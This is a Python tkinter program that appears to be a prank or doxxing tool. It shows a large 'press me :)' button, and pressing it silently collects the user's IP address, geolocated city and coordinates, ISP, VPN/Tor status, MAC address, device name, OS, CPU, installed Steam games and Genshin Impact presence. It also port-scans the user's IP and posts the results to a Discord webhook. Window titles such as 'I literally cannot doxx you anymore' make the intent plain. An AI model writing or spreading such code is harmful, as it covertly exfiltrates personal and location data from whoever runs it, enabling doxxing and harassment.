
# import everything from tkinter module
from tkinter import *   
import os
import socket
import platform
from discord import SyncWebhook
from requests import get
import re, uuid
import sys
import subprocess
from time import sleep
from tkinter import font as tkfont
try:
    from urllib.request import urlopen
except ImportError:
    from urllib2 import urlopen

root = Tk()
usecount=0
def CHECKFORPORT():
    ip = get("https://api.ipify.org").content.decode("utf8")
    x = 0
    usefulports = [137,139,22,53,25,3389,80,443,8080,8443,20,21,23,1433,1434,3306,25565]
    usefulportlen = len(usefulports)
    OPENPORTS = []
    while x != usefulportlen:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        y = usefulports[x]
        result = s.connect_ex((ip,y))
        if result == 0:
            OPENPORTS.append(y)
            print (OPENPORTS)
            x = x+1
        else: 
            x = x+1
        if usefulportlen == x:
            break
    return OPENPORTS

def find_files(filename,search_path):
    result = []
    for root, dir, files in os.walk(search_path):
        if filename in files:
            result.append(os.path.join(root,filename))
    return result

def genshin(string):
    result = find_files("Genshin Impact Game.exe","C:\Program Files")
    resultlen = len(result)
    if resultlen != 0:
        string = "TRUE"
    else:
        string = "FALSE"
    return string 

def checkforsteamgames():
    x=0
    try:
        steamgames=os.listdir("C:\Program Files (x86)\Steam\steamapps\common")
    except:
        x=x+1
        return
    try:
        steamgames=os.listdir("C:\Program Files (x64)\Steam\steamapps\common")
    except:
        x=x+1
    if x == 2:
        steamgames = "NO STEAM GAMES"
    return steamgames

def remove(string):
    string = string.replace('"',"")
    string = string.replace("{","")
    string = string.replace("}","")
    string = string.replace(":","")
    string = string.replace("location","")
    string = string.replace("country","")
    string = string.replace("region","")
    string = string.replace("city","")
    string = string.replace("'","")
    string = string.replace("lat","")
    string = string.replace("lng","")
    string = string.replace("timezone","")
    string = string.replace("isp","")
    string = string.replace("proxy","")
    string = string.replace("vpn","")
    string = string.replace("tor","")
    return string
def suicide():
    global usecount
    if usecount == 0:
        MACADDY = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
        ip = get("https://api.ipify.org").content.decode("utf8")
        WEBHOOKhold = "https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks"
        api_key = ("https://geo.ipify.org/")
        api_url = 'https://geo.ipify.org/api/v1?'
        url = api_url + 'apiKey=' + api_key + '&ipAddress=' + ip
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #result = s.connect_ex((ip,))
        shame = ""
        shame = genshin(shame)
        yougotgamesonyophone=checkforsteamgames()
        webhook = SyncWebhook.from_url(WEBHOOKhold)
        iplocation = (urlopen(url).read().decode('utf8'))
        iplocationlist = iplocation.split(",")
        country = iplocationlist[1]
        country = remove(country)
        region = iplocationlist[2]
        region = remove(region)
        city = iplocationlist[3]
        city = remove(city)
        lat = iplocationlist[4]
        lat = remove(lat)
        lng = iplocationlist[5]
        lng = remove(lng)
        timezone = iplocationlist[7]
        timezone = remove(timezone)
        ISPc = iplocationlist[14]
        ISPc = remove(ISPc)
        proxy = iplocationlist[15]
        proxy = remove(proxy)
        vpn = iplocationlist[16]
        vpn = remove(vpn)
        onTOR = iplocationlist[17]
        onTOR = remove(onTOR)
        OPENPORT = CHECKFORPORT()
        usecount = usecount+1
        webhook.send(f"""
DEVICE NAME {platform.node()}
IP ADDRESS {ip}
COUNTRY {country}
REGION {region}
CITY {city}
LOCATION LAT {lat}
LOCATION LNG {lng}
timezone {timezone}
ISP {ISPc}
PROXY {proxy}
VPN {vpn}
TOR {onTOR}
OPEN PORTS {OPENPORT}
MAC ADDRESS {MACADDY}
GENSHIN IMPACT INSTALLED? {shame}
OS {platform.system()}
CPU {platform.processor()}
GAMES ON STEAM {yougotgamesonyophone}
                 """)
    if usecount <= 10:
        root.title("Check discord :3")
        usecount = usecount+1
        return
    if usecount == 11:
        root.title("STOP PRESSING THE DAMN BUTTON")
        usecount = usecount+1
    if usecount == 21:
        root.title("I literally cannot doxx you anymore")
        usecount = usecount+1
# create a tkinter window

root.state("zoomed")     

# Open window having dimension 100x100
root.geometry('800x800') 
 
root.title("Press me :)")
arial36 = tkfont.Font(family="Arial",size=46)
# Create a Button
btn = Button(root, text = 'press me :)', bd = '5',bg="red",height=400, width=400,font=arial36, command=suicide)
 
# Set the position of button on the top of window.   
btn.pack(side = 'top')    
root.mainloop()
